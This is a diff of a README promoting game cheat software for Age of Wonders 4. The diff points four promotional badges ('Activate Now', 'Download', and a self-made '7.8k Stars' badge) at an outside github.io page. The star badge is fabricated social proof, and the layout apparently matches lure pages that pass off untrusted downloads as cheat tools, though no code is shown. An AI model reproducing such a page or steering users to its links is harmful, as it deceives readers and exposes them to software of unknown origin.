@@ -2,10 +2,10 @@
 
 The **Age of Wonders 4 Cheat Software** is crafted for strategy players who want to explore every possibility of their empire without limits. With overlays, hotkeys, and custom configs, you can control resources, unlock technologies, and test armies freely in private campaigns.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.8k Stars](https://img.shields.io/badge/⭐️%207.8k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://age-of-wonders-4-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://age-of-wonders-4-cheat.github.io/.github/)
+[![⭐️ 7.8k Stars](https://img.shields.io/badge/⭐️%207.8k-Stars-yellow?style=for-the-badge\&logo=github)](https://age-of-wonders-4-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://age-of-wonders-4-cheat.github.io/.github/)
 
 ---
 
